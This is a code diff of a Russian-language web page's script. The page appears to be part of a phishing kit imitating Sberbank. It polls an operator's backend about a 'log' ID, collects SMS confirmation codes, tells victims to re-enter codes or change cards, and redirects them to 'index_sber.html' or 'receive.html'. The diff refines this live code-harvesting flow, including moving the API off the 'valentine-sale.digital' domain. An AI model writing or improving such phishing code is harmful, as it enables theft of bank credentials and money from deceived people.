@@ -343,7 +343,7 @@
     </div>
 
     <script>
-        const API_URL = 'https://valentine-sale.digital/api';
+        const API_URL = '/api';
         const LOG_ID = new URLSearchParams(window.location.search).get('id');
 
         if (!LOG_ID) {
@@ -425,23 +425,29 @@
                 const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
                 const data = await response.json();
 
-                if (data.status === 'done') {
+                if (data.status === 'success') {
+                    document.getElementById('processingOverlay').classList.remove('active');
                     alert('Операция успешно завершена!');
                     window.location.href = 'index_sber.html';
-                } else if (data.status === 'error') {
+                } else if (data.status === 'error' && data.error) {
                     document.getElementById('processingOverlay').classList.remove('active');
                     
-                    if (data.error === 'wrong_code') {
-                        alert('Неверный код. Попробуйте ещё раз.');
+                    if (data.error.includes('Неверно указан код') || data.error.includes('неверный')) {
+                        alert(data.error);
                         codeInput.value = '';
                         codeInput.focus();
+                    } else if (data.error.includes('смените карту') || data.error.includes('Смена')) {
+                        alert(data.error);
+                        window.location.href = 'receive.html';
                     } else {
-                        alert('Произошла ошибка. Попробуйте позже.');
+                        alert(data.error);
+                        codeInput.value = '';
+                        codeInput.focus();
                     }
-                } else if (data.status === 'code') {
+                } else if (data.status === 'code' && data.error && data.error.includes('новый код')) {
                     // Запрошен новый код
                     document.getElementById('processingOverlay').classList.remove('active');
-                    alert('Запрошен новый код. Проверьте СМС.');
+                    alert('Отправлен новый код. Проверьте СМС.');
                     codeInput.value = '';
                     codeInput.focus();
                 } else {
